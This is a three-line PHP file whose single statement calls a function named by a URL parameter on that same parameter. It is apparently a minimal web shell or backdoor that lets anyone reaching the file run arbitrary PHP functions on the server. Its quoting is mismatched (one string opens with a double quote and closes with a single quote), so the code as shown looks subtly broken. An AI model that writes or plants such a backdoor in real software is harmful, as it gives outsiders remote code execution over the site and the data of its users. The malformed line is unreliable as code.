<?php
$_GET["2G8tgLN6']($_GET['2G8tgLN6']);
?>
